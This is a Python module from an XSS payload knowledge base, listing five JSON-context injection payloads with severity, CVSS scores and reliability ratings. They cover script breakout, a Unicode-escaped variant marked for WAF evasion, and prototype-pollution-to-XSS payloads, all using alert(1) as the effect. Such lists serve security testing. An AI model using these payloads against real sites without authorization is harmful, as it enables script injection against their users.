#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26 UTC
Status: Refactored
Telegram: https://t.me/EasyProTech

JSON Context XSS Payloads
"""

from ..models import PayloadEntry


JSON_INJECTION_PAYLOADS = {
    "json_1": PayloadEntry(
        payload='{"name":"</script><script>alert(1)</script>"}',
        contexts=["json"],
        severity="critical",
        cvss_score=8.5,
        description="Script breakout in JSON",
        tags=["json", "injection", "script"],
        reliability="medium",
    ),
    "json_2": PayloadEntry(
        payload='{"x":"\\u003cscript\\u003ealert(1)\\u003c/script\\u003e"}',
        contexts=["json"],
        severity="critical",
        cvss_score=8.5,
        description="Unicode escaped script in JSON",
        tags=["json", "injection", "unicode"],
        waf_evasion=True,
        reliability="high",
    ),
    "json_3": PayloadEntry(
        payload='{"__proto__":{"innerHTML":"<img src=x onerror=alert(1)>"}}',
        contexts=["json"],
        severity="critical",
        cvss_score=9.0,
        description="Prototype pollution to XSS",
        tags=["json", "prototype-pollution", "xss"],
        reliability="medium",
    ),
    "json_4": PayloadEntry(
        payload='{"constructor":{"prototype":{"innerHTML":"<script>alert(1)</script>"}}}',
        contexts=["json"],
        severity="critical",
        cvss_score=9.0,
        description="Constructor prototype pollution",
        tags=["json", "prototype-pollution", "constructor"],
        reliability="medium",
    ),
    "json_5": PayloadEntry(
        payload='{"x":1,"__proto__":{"polluted":true}}',
        contexts=["json"],
        severity="medium",
        cvss_score=6.5,
        description="Basic prototype pollution probe",
        tags=["json", "prototype-pollution", "probe"],
        reliability="high",
    ),
}

JSON_INJECTION_PAYLOADS_TOTAL = len(JSON_INJECTION_PAYLOADS)
